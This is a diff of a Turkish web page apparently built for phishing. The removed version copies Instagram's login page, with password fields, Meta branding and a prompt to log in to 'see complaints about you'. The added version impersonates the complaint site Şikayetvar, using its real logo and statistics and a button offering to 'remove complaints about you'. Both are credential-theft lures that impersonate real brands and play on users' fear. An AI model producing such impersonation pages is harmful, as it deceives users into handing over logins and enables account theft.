@@ -1,69 +1,105 @@
 <!DOCTYPE html>
 <html lang="tr">
-    <link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
 <head>
-
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Instagram Giriş</title>
-  <link rel="stylesheet" href="style.css"/>
-  <link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
+  <title>Şikayetvar</title>
+  <link rel="stylesheet" href="style.css" />
 </head>
 <body>
-  <div class="wrapper">
-    <div>
-      <img src="https://instaproapp.tools/wp-content/uploads/2025/07/insta-pro.png" alt="Instagram görseli" class="main-image">
+  <header>
+    <div class="top-bar">
+      <span>Toplam çözüm sayısı</span>
+      <span class="count">3.935.173</span>
+      <button class="live-btn">🔴 CANLI İZLE</button>
     </div>
+    <nav class="navbar">
+      <div class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/f/f5/%C5%9Eikayetvar_Logo_2020_V2.png" alt="Şikayetvar Logo" style="height: 50px;" />
+      </div>
+      <ul>
+        <li><a href="#">Şikayetler</a></li>
+        <li><a href="#">Trend 100</a></li>
+      </ul>
+      <div class="nav-buttons">
+        <a href="#" class="login-btn">Giriş Yap / Üye Ol</a>
+        <a href="#" class="complaint-btn">+ Şikayet Yaz</a>
+      </div>
+    </nav>
+  </header>
 
-    <div class="login-container">
-      <h1 class="logo">Instagram</h1>
-
-      <form>
-        <input type="text" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
-        <input type="password" placeholder="Şifre" required>
-        <button type="submit">Giriş yap</button>
-      </form>
-
-      <div class="divider"><span>YA DA</span></div>
-
-      <button class="facebook-login">
-        © Instagram Şikayet Merkezi
-      </button>
-
-      <a href="#" class="forgot-password">Şifreni mi unuttun?</a>
-
-      <div class="signup">
-        Hakınızada Şikayetleri Görmek İçin Giriş Yapınız. <a href="#"></a>
+  <main class="hero">
+    <div class="hero-left">
+      <h1>Çözüm için<br />Şikayetvar</h1>
+      <div class="search-box">
+        <input type="text" placeholder="Adıma şikayet olabilir mi?" />
+        <button>Ara</button>
       </div>
     </div>
+    <div class="left-center-button">
+      <a href="#" class="green-button">Size Ait Şikayetleri Kaldırmak İçin Tıklayın</a>
+    </div>
+  </main>
+
+  <div class="gorsel-container">
+    <img src="https://www.yenisikayet.com.tr/wp-content/uploads/2024/12/Yeni-Sikayet-2.png"
+      alt="Şikayet Görsel"
+      class="gorsel"
+    />
   </div>
 
-
-   <footer class="site-footer">
-   <div class="footer-links">
-    <a href="#">Meta</a>
-    <a href="#">Hakkında</a>
-    <a href="#">Blog</a>
-    <a href="#">İş Fırsatları</a>
-    <a href="#">Yardım</a>
-    <a href="#">API</a>
-    <a href="#">Gizlilik</a>
-    <a href="#">Koşullar</a>
-    <a href="#">Konumlar</a>
-    <a href="#">Instagram Lite</a>
-    <a href="#">Meta AI</a>
-    <a href="#">Meta AI Makaleleri</a>
-    <a href="#">Threads</a>
-    <a href="#">Kişi Yükleme ve Hesabı Olmayan Kişiler</a>
-    <a href="#">Meta Verified</a>
-   </div>
-   <div class="footer-bottom">
-    <div class="language-select">
-      Türkçe <span class="dropdown-arrow">▼</span>
+  <section class="stats-section">
+    <h2 class="stats-title">Sayılarla Şikayetvar</h2>
+    <div class="stats-cards">
+      <div class="stat-card">
+        <img src="https://cdn-icons-png.flaticon.com/512/847/847969.png" alt="Üye" />
+        <p class="stat-label">Bireysel Üye Sayısı</p>
+        <p class="stat-number">13.549.183</p>
+      </div>
+      <div class="stat-card">
+        <img src="https://cdn-icons-png.flaticon.com/512/1008/1008964.png" alt="Marka" />
+        <p class="stat-label">Kayıtlı Marka</p>
+        <p class="stat-number">242.159</p>
+      </div>
+      <div class="stat-card">
+        <img src="https://cdn-icons-png.flaticon.com/512/942/942748.png" alt="Çözülen" />
+        <p class="stat-label">Çözülen Şikayet</p>
+        <p class="stat-number">3.926.243</p>
+      </div>
+      <div class="stat-card">
+        <img src="https://cdn-icons-png.flaticon.com/512/159/159604.png" alt="Ziyaretçi" />
+        <p class="stat-label">Son 30 Günde Ziyaretçi</p>
+        <p class="stat-number">22.809.130</p>
+      </div>
     </div>
-    <div class="copyright">© 2025 Instagram from Meta</div>
+  </section>
+
+  <footer class="footer">
+   <div class="footer-container">
+     <!-- Logo -->
+     <div class="footer-logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/1/1a/%C5%9Eikayetvar_logo.svg" alt="Şikayetvar" />
+     </div>
+
+     <!-- Menü -->
+     <nav class="footer-nav">
+       <a href="#">Hakkımızda</a>
+       <a href="#">Markalar İçin</a>
+       <a href="#">Blog</a>
+       <a href="#">Ürün Rehberi</a>
+       <a href="#">Sıkça Sorulan Sorular</a>
+       <a href="#">İletişim</a>
+     </nav>
+
+     <!-- Sosyal Medya İkonları -->
+     <div class="footer-social">
+       <a href="#"><img src="https://cdn-icons-png.flaticon.com/512/733/733579.png" alt="X" /></a>
+       <a href="#"><img src="https://cdn-icons-png.flaticon.com/512/1384/1384060.png" alt="YouTube" /></a>
+       <a href="#"><img src="https://cdn-icons-png.flaticon.com/512/733/733547.png" alt="Facebook" /></a>
+       <a href="#"><img src="https://cdn-icons-png.flaticon.com/512/733/733561.png" alt="LinkedIn" /></a>
+     </div>
    </div>
- </footer>
- 
+</footer>
+
 </body>
 </html>
